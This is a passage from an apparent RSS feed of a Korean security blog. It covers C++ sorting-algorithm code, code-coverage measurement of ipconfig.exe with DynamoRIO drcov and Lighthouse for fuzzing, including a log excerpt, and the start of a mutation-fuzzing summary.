class="keyword">int</span>&gt; &amp;vec)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;vec.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;   </span><br><span class="line">        min = i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;vec.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vec[j] &lt; vec[min])&#123;</span><br><span class="line">                min = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp = vec[i];</span><br><span class="line">        vec[i] = vec[min];</span><br><span class="line">        vec[min] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/159406236-58f460d6-9db9-45bd-ac6e-bb346958ec00.gif" alt="selection-sort-001"></p><ul><li>시간 복잡도 : n(n-1)/2 =&gt; O(N^2)</li><li>공간 복잡도 : O(N)</li><li>Unstable sort.</li></ul><h2 id="Insertion-Sort"><a href="#Insertion-Sort" class="headerlink" title="Insertion Sort"></a>Insertion Sort</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertion_sort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;vec)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;vec.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> prev = i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp = vec[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(prev;prev&gt;=<span class="number">0</span>;prev--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vec[prev] &gt; tmp)</span><br><span class="line">                vec[prev+<span class="number">1</span>] = vec[prev];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vec[prev+<span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/159408532-6975e2a7-52bd-4a43-a1bc-fb03af21afc0.gif" alt="insertion-sort-001"></p><ul><li>시간 복잡도 : best case = O(N), worst case = O(N^2)</li><li>공간 복잡도 : O(N)</li><li>Stable sort.</li></ul><h2 id="Merge-Sort"><a href="#Merge-Sort" class="headerlink" title="Merge Sort"></a>Merge Sort</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">merge</span><span class="params">(vector&lt;T&gt;&amp; arr1, vector&lt;T&gt;&amp; arr2)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    vector&lt;T&gt; merged;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iter1 = arr1.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">auto</span> iter2 = arr2.<span class="built_in">begin</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(iter1 != arr1.<span class="built_in">end</span>() &amp;&amp; iter2 != arr2.<span class="built_in">end</span>())&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*iter1 &lt; *iter2)&#123;</span><br><span class="line">            merged.<span class="built_in">emplace_back</span>(*iter1);</span><br><span class="line">            iter1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            merged.<span class="built_in">emplace_back</span>(*iter2);</span><br><span class="line">            iter2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(iter1 != arr1.<span class="built_in">end</span>())&#123;</span><br><span class="line">        <span class="keyword">for</span>(;iter1 != arr1.<span class="built_in">end</span>(); iter1++)</span><br><span class="line">            merged.<span class="built_in">emplace_back</span>(*iter1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(;iter2 != arr2.<span class="built_in">end</span>();iter2++)</span><br><span class="line">            merged.<span class="built_in">emplace_back</span>(*iter2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> merged;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">vector&lt;T&gt; <span class="title">merge_sort</span><span class="params">(vector&lt;T&gt; arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arr.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">auto</span> mid = <span class="built_in">size_t</span>(arr.<span class="built_in">size</span>()/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">auto</span> left_half = merge_sort&lt;T&gt;(vector&lt;T&gt;(arr.<span class="built_in">begin</span>(),arr.<span class="built_in">begin</span>()+mid));</span><br><span class="line">        <span class="keyword">auto</span> right_half = merge_sort&lt;T&gt;(vector&lt;T&gt;(arr.<span class="built_in">begin</span>()+mid, arr.<span class="built_in">end</span>()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> merge&lt;T&gt;(left_half,right_half);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/160076472-b77828c7-9ec2-4121-820c-a03deda404df.png" alt="618px-Merge_sort_algorithm_diagram svg"></p><ul><li>LinkedList의 정렬에 효과적.</li><li>시간 복잡도 : O(NlogN)</li><li>Stable sort</li></ul><h2 id="Quick-Sort"><a href="#Quick-Sort" class="headerlink" title="Quick Sort"></a>Quick Sort</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">partition</span><span class="params">(<span class="keyword">typename</span> vector&lt;T&gt;::iterator begin, <span class="keyword">typename</span> vector&lt;T&gt;::iterator end)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> pivot_val = *begin;</span><br><span class="line">    <span class="keyword">auto</span> left_iter = begin + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> right_iter = end;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(*left_iter &lt;= pivot_val &amp;&amp; <span class="built_in">distance</span>(left_iter,right_iter) &gt; <span class="number">0</span>)</span><br><span class="line">            left_iter++;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span>(*right_iter &gt; pivot_val &amp;&amp; <span class="built_in">distance</span>(left_iter,right_iter) &gt; <span class="number">0</span>)</span><br><span class="line">            right_iter--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(left_iter == right_iter)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">iter_swap</span>(left_iter,right_iter);        </span><br><span class="line"></span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pivot_val &gt; *right_iter)</span><br><span class="line">        <span class="built_in">iter_swap</span>(begin,right_iter);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> right_iter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">typename</span> vector&lt;T&gt;::iterator begin, <span class="keyword">typename</span> vector&lt;T&gt;::iterator last)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">distance</span>(begin,last) &gt;= <span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> partition_iter = partition&lt;T&gt; (begin, last);</span><br><span class="line"></span><br><span class="line">        quick_sort&lt;T&gt;(begin, partition_iter - <span class="number">1</span>);</span><br><span class="line">        quick_sort&lt;T&gt;(partition_iter,last);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/160099702-09764768-e439-4938-a0a3-b7f99381176c.gif" alt="quick-sort-001"></p><ul><li>시간복잡도 : O(Nlog2N)</li><li>공간복잡도 : O(N)</li><li>Unstable sort</li></ul><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><p><a href="https://gyoogle.dev/blog/algorithm/Bubble%20Sort.html">https://gyoogle.dev/blog/algorithm/Bubble%20Sort.html</a></p>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Algorithm/">Algorithm</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/algorithm/">algorithm</category>
      
      <category domain="https://pwnkidhn.github.io/tags/sorting/">sorting</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/03/24/2022-03-25-Sorting/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Code Coverage Measurement with Dynamo Rio &amp; Lighthouse</title>
      <link>https://pwnkidhn.github.io/2022/03/23/2022-03-24-Coverage/</link>
      <guid>https://pwnkidhn.github.io/2022/03/23/2022-03-24-Coverage/</guid>
      <pubDate>Wed, 23 Mar 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;커버리지에 대한 의미는 이전 포스팅에 간략하게 정의했으니 넘어가겠다.&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/&quot;&gt;https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;퍼징을 진행하는데 있어 커버리지 측정에 대한 개념이 제대로 잡히질 않아  몇 가지 의문이 들었다.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;커버리지 측정 계산은 어떻게 하는 것일까?&lt;/li&gt;
&lt;li&gt;coverage guided 퍼징 시 커버리지 측정이 어디까지 되는것인가?, 어느 부분이 필요한가? &lt;/li&gt;
&lt;li&gt;Windows 프로그램을 예시로, A회사의 프로그램을 퍼징하면서 WINAPI의 취약점을 찾을 수 도 있는 것일까? &lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;조사를 통해 의문에 대한 나만의 답을 찾았지만, 잘 못 이해한것일 수 도 있으니 참고만 하자.</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>커버리지에 대한 의미는 이전 포스팅에 간략하게 정의했으니 넘어가겠다.<ul><li><a href="https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/">https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/</a></li></ul></li><li>퍼징을 진행하는데 있어 커버리지 측정에 대한 개념이 제대로 잡히질 않아  몇 가지 의문이 들었다.</li></ul><ol><li>커버리지 측정 계산은 어떻게 하는 것일까?</li><li>coverage guided 퍼징 시 커버리지 측정이 어디까지 되는것인가?, 어느 부분이 필요한가? </li><li>Windows 프로그램을 예시로, A회사의 프로그램을 퍼징하면서 WINAPI의 취약점을 찾을 수 도 있는 것일까? </li></ol><ul><li>조사를 통해 의문에 대한 나만의 답을 찾았지만, 잘 못 이해한것일 수 도 있으니 참고만 하자.<span id="more"></span></li></ul><h2 id="환경"><a href="#환경" class="headerlink" title="환경"></a>환경</h2><ul><li>커버리지 측정을 보기위해 Windows 환경에서 DynamoRIO와 Lighthouse를 사용하였다.</li><li>구축 방법은 공식 홈페이지를 참고하면 된다.</li><li>DynamoRio : <a href="https://dynamorio.org/page_releases.html">https://dynamorio.org/page_releases.html</a></li><li>Lighthouse : <a href="https://github.com/gaasedelen/lighthouse">https://github.com/gaasedelen/lighthouse</a></li></ul><h2 id="실습"><a href="#실습" class="headerlink" title="실습"></a>실습</h2><ul><li>ipconfig 바이너리를 가지고 코드 커버리지를 측정해 보겠다.</li><li>아래 명령어를 통해 커버리지 로그를 얻을 수 있다.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:..\DynamoRIO-Windows-9.0.1\bin64</span><br><span class="line">drrun -t drcov -dump_text -- [PATH]</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/159886495-70ab1ec9-2379-4268-8ab1-29c329d0ae48.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">DRCOV VERSION: 2</span><br><span class="line">DRCOV FLAVOR: drcov</span><br><span class="line">Module Table: version 5, count 18</span><br><span class="line">Columns: id, containing_id, start, end, entry, offset, preferred_base, checksum, timestamp, path</span><br><span class="line">  0,   0, 0x0000000071000000, 0x00000000711c0000, 0x00000000710a2e70, 0000000000000000, 0x0000000071000000, 0x0019203b, 0x620aa6ec,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\lib64\release\dynamorio.dll</span><br><span class="line">  1,   1, 0x00007ff63a6a0000, 0x00007ff63a6a6000, 0x00007ff63a6a0000, 0000000000000000, 0x0000000072000000, 0x0000ab8b, 0x620aa777,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\tools\lib64\release\drcov.dll</span><br><span class="line">  2,   2, 0x00007ff63a6b0000, 0x00007ff63a6b9000, 0x00007ff63a6b0000, 0000000000000000, 0x0000000073800000, 0x0001401b, 0x620aa776,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\ext\lib64\release/drcovlib.dll</span><br><span class="line">  3,   3, 0x00007ff63a6c0000, 0x00007ff63a6cf000, 0x00007ff63a6c0000, 0000000000000000, 0x0000000077000000, 0x000149e8, 0x620aa772,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\ext\lib64\release/drx.dll</span><br><span class="line">  4,   4, 0x00007ff63a6d0000, 0x00007ff63a6db000, 0x00007ff63a6d0000, 0000000000000000, 0x0000000078000000, 0x0001746d, 0x620aa761,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\ext\lib64\release/drreg.dll</span><br><span class="line">  5,   5, 0x00007ff63a6e0000, 0x00007ff63a6f0000, 0x00007ff63a6e0000, 0000000000000000, 0x0000000073000000, 0x00014cc5, 0x620aa75e,  C:\Users\pwnki\Desktop\DynamoRIO-Windows-9.0.1\ext\lib64\release/drmgr.dll</span><br><span class="line">  6,   6, 0x00007ff69a690000, 0x00007ff69a69d000, 0x00007ff69a6952c0, 0000000000000000, 0x00007ff69a690000, 0x00016cf7, 0x60005d63,  C:\Windows\System32\ipconfig.exe</span><br><span class="line">  7,   7, 0x00007ffccdb20000, 0x00007ffccdb37000, 0x00007ffccdb224b0, 0000000000000000, 0x00007ffccdb20000, 0x00014e4a, 0xc962e034,  C:\Windows\System32\dhcpcsvc6.DLL</span><br><span class="line">  8,   8, 0x00007ffccdbb0000, 0x00007ffccdbcd000, 0x00007ffccdbb29b0, 0000000000000000, 0x00007ffccdbb0000, 0x0002666a, 0x1c1d619d,  C:\Windows\System32\dhcpcsvc.DLL</span><br><span class="line">  9,   9, 0x00007ffcd2200000, 0x00007ffcd223b000, 0x00007ffcd220a620, 0000000000000000, 0x00007ffcd2200000, 0x0003ecbd, 0xcf9a121a,  C:\Windows\System32\IPHLPAPI.DLL</span><br><span class="line"> 10,  10, 0x00007ffcd2240000, 0x00007ffcd230b000, 0x00007ffcd226be10, 0000000000000000, 0x00007ffcd2240000, 0x000ca5e2, 0x441ccbe1,  C:\Windows\System32\DNSAPI.dll</span><br><span class="line"> 11,  11, 0x00007ffcd2df0000, 0x00007ffcd30b8000, 0x00007ffcd2e01bd0, 0000000000000000, 0x00007ffcd2df0000, 0x002d64e4, 0x1183946c,  C:\Windows\System32\KERNELBASE.dll</span><br><span class="line"> 12,  12, 0x00007ffcd3fe0000, 0x00007ffcd409d000, 0x00007ffcd3ff70d0, 0000000000000000, 0x00007ffcd3fe0000, 0x000c8b3e, 0x2f7cc9b6,  C:\Windows\System32\KERNEL32.DLL</span><br><span class="line"> 13,  13, 0x00007ffcd4f60000, 0x00007ffcd4fcb000, 0x00007ffcd4f74300, 0000000000000000, 0x00007ffcd4f60000, 0x0006cf4b, 0xaff3315b,  C:\Windows\System32\WS2_32.dll</span><br><span class="line"> 14,  14, 0x00007ffcd5000000, 0x00007ffcd5008000, 0x00007ffcd50022f0, 0000000000000000, 0x00007ffcd5000000, 0x000117c5, 0xaa9c8581,  C:\Windows\System32\NSI.dll</span><br><span class="line"> 15,  15, 0x00007ffcd50a0000, 0x00007ffcd513e000, 0x00007ffcd50a7850, 0000000000000000, 0x00007ffcd50a0000, 0x0009e85d, 0x564f9f39,  C:\Windows\System32\msvcrt.dll</span><br><span class="line"> 16,  16, 0x00007ffcd5510000, 0x00007ffcd5634000, 0x00007ffcd556db80, 0000000000000000, 0x00007ffcd5510000, 0x0012ce1d, 0x76243d9a,  C:\Windows\System32\RPCRT4.dll</span><br><span class="line"> 17,  17, 0x00007ffcd56b0000, 0x00007ffcd58a6000, 0x00007ffcd56b0000, 0000000000000000, 0x00007ffcd56b0000, 0x001fd6e7, 0xe5d7ed5c,  C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">BB Table: 14257 bbs</span><br><span class="line">module id, start, size:</span><br><span class="line">module[ 17]: 0x000000000004cea0,  19</span><br><span class="line">module[ 17]: 0x000000000004ceb3,  14</span><br><span class="line">module[ 17]: 0x000000000008b7c0,  29</span><br><span class="line">module[ 17]: 0x000000000008b7dd,   6</span><br><span class="line">module[ 17]: 0x000000000008b7f1,  10</span><br><span class="line">module[ 17]: 0x000000000008b7fb,   3</span><br><span class="line">module[ 12]: 0x0000000000017020,   8</span><br><span class="line">module[ 12]: 0x0000000000017028,  12</span><br><span class="line">module[ 17]: 0x000000000008b7e3,   3</span><br><span class="line">module[  6]: 0x00000000000052c0,   9</span><br><span class="line">module[  6]: 0x00000000000057e4,  44</span><br><span class="line">module[  6]: 0x00000000000058a3,  21</span><br><span class="line">module[  6]: 0x00000000000052c9,   9</span><br><span class="line">module[  6]: 0x00000000000050f0,  49</span><br><span class="line">module[  6]: 0x000000000000513c,  15</span><br><span class="line">module[  6]: 0x0000000000005157,  10</span><br><span class="line">module[  6]: 0x0000000000005161,  34</span><br><span class="line">module[  6]: 0x0000000000005183,   4</span><br><span class="line">module[  6]: 0x0000000000005187,   6</span><br><span class="line">module[  6]: 0x000000000000519d,  11</span><br><span class="line">module[  6]: 0x000000000000517e,   5</span><br><span class="line">module[  6]: 0x000000000000518d,  12</span><br><span class="line">module[  6]: 0x0000000000004fc0,  18</span><br><span class="line">module[  6]: 0x0000000000004fd6,  25</span><br></pre></td></tr></table></figure><ul><li>로그의 일부분으로, 바이너리가 실행에 필요한 모든 dll들을 로드하며, 거기에 대한 커버리지를 측정한다. </li><li>IDA로 커버리지 확인을 할 바이너리 혹은 DLL을 열고, Lighthouse를 통해 커버리지 로그를 불러오면 아래와 같이 확인할 수 있다.</li><li>(Ipconfig.exe에 대한 커버리지 확인)</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/159887032-cece2318-29e3-47f9-ba2c-b7559ce55e59.png" alt="image"></p><ul><li>block 단위로 커버리지를 측정하는 것을 확인할 수 있다. </li><li>또한 전체 블록 중 몇 개의 블록을 커버했는지 확인할 수 있다.</li><li>이를 바탕으로 커버리지를 수치화하는 방법은 (커버한 블록 / 전체 블록) 으로 계산하는 것 같다.</li></ul><ul><li>1번 의문은 커버리지를 측정하기 위해 인스트루먼트 단계에서 전체 블록에 대한 값을 얻을 수 있고,</li><li>커버한 블록 갯수 역시 얻을 수 있기에 이 둘을 활용하여 계산 하는 것으로 확인했다.</li></ul><ul><li>2번, 3번 의문을 풀기 위해 예시를 들어보겠다.</li><li>프로그램 A, A.dll, Windows.dll 세 개의 파일이 있다고 가정하자. (프로그램 마다 다르다.)</li></ul><ol><li>프로그램 A는 A회사에서 만든 모듈로, 코드에는 A.dll에 있는 함수를 호출해서 사용하거나 자체적인 함수가 내장되어 있다.</li><li>A.dll은 A 회사에서 만든 자체 함수들이 정의되어 있다. 여기 있는 함수는 Windows에서 제공하는 WINAPI를 바탕으로 만들어진 함수이다.</li><li>Windows.dll은 WINAPI 함수들이 정의되어 있다. </li></ol><ul><li>전체적인 흐름은 아래와 같다.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">프로그램 A (A.dll에 있는 함수 일부 호출) -&gt; A.dll(자체함수 정의 부분, 내부적으로 WINAPI 호출) -&gt; Windows.dll(WINAPI 함수 정의부분)</span><br></pre></td></tr></table></figure></li><li>여기서 드는 의문은 과연 코드 커버리지는 어디 까지 측정되며, 어디 까지 측정 해야 할까. 그리고 프로그램 A를 퍼징한다면 결국 Windows.dll에 있는 WINAPI에 대한 취약점도 찾을 수 있는 것인가 이다.</li></ul><ul><li>DynamoRio를 통해 확인 한 결과, 커버리지는 전체 다 측정 되는 것으로 확인할 수 있다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/159891718-bee7e6f9-d199-45f5-b534-798ef4ce0961.png" alt="image"></p><ul><li><p>커버리지 로그를 보면 바이너리 실행 시 로드 되는 모든 dll에 대해 인스트루먼트를 진행하고, 커버리지를 측정하는 것을 확인할 수 있다.</p></li><li><p>(로드된 dll에 대한 커버리지)</p></li></ul><p><img src="https://user-images.githubusercontent.com/49066484/159888937-fef9e771-721d-4c14-8152-c7294b9b9b6a.png" alt="image"></p><ul><li>그럼 A 회사 제품에 대한 퍼즈 테스팅을 위해서라면 어디까지의 커버리지 정보가 필요할까</li></ul><ol><li><p>프로그램 A에 대해 측정한다면, 발생하는 버그는 A.dll에 있는 함수들을 잘 못 사용해서 발생하는것으로, 함수 호출 순서나 방법을 고치면 된다. 혹은 프로그램에 정의된 함수의 로직이 잘 못되어 발생하는 경우이다.</p></li><li><p>A.dll에 대해 측정한다면, 발생하는 버그는 Windows.dll의 WINAPI들을 잘 못 사용해서 발생하는 것으로, A.dll의 함수 로직을 고쳐야한다.</p><ul><li>Harness 프로그램을 dll에 있는 함수를 가지고 짠다면, 커버리지를 해당 dll을 측정해야 한다. </li></ul></li><li><p>Windows.dll에 대해 측정한다면, 발생하는 버그는 WINAPI 함수의 로직에서 발생하는 것이다. 즉 A 회사 제품에 대한 취약점을 찾는 것이 아니다. WINAPI 함수 로직을 고쳐야한다.</p></li></ol><ul><li>또한 보통 3번의 경우는 흔하지 않아 보인다.</li></ul><ul><li><p>결론을 내리면, 의문 2는 퍼즈 테스팅 대상에 따라 다르다고 볼 수 있다. 공격 벡터를 정하고, 해당 기능을 처리하는 부분을 대상으로 퍼즈 테스팅을 진행하기에, 해당 부분의 커버리지가 필요하다.</p></li><li><p>그 부분이 프로그램에 정의 되어 있다면, 프로그램에 대한 커버리지가 필요하고, dll로 따로 정의 되어있다면 dll에 대한 커버리지가 필요하다. </p></li><li><p>WinAFL 퍼저의 경우 커버리지 측정 모듈을 지정해주는 옵션이 있어 필요한 커버리지만 얻을 수 있다.</p></li><li><p>의문 3은 흔하지 않은 경우로 생각 된다. A 제품에 대한 보안 검사로 A회사가 자체적으로 만든 프로그램이나 dll에 대해서만 퍼즈 테스팅을 진행하고, 커버리지를 측정하면 될 것 같다.</p></li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>바이너리와 실행시 로드되는 DLL 전부 인스트루먼트를 진행 하고, 커버리지를 측정한다.<br>퍼즈 테스팅 대상에 따라 필요한 커버리지 정보가 다르다.</p><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><p><a href="https://www.youtube.com/watch?v=g6Jp3KZNles">https://www.youtube.com/watch?v=g6Jp3KZNles</a></p>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/03/23/2022-03-24-Coverage/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>The Fuzzing Book_03_Mutation-Based Fuzzing</title>
      <link>https://pwnkidhn.github.io/2022/02/23/2022-02-24-03_Mutation/</link>
      <guid>https://pwnkidhn.github.io/2022/02/23/2022-02-24-03_Mutation/</guid>
      <pubDate>Wed, 23 Feb 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;a href=&quot;https://www.fuzzingbook.org/html/MutationFuzzer.html&quot;&gt;https://www.fuzzingbook.org/html/MutationFuzzer.html&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;대부분의 randomly generated inputs은 구문적으로 invalid하기에 프로그램에 의해 빠르게 거부된다.&lt;/li&gt;
&lt;li&gt;따라서 유요한 입력을 얻을 수 있는 기회를 늘려야 한다.&lt;/li&gt;
&lt;li&gt;그러한 방법 중 하나가 mutation fuzzing이다. &lt;/li&gt;
&lt;li&gt;즉, 입력을 유효하게 유지하면서도 새로운 동작을 수행할 수 있도록 기존 입력에 작은 mutate를 하는 것이다.&lt;/li&gt;
&lt;li&gt;AFL 퍼저는 위와 같은 개념의 fuzzing을 진행한다.</description>
      
      
      
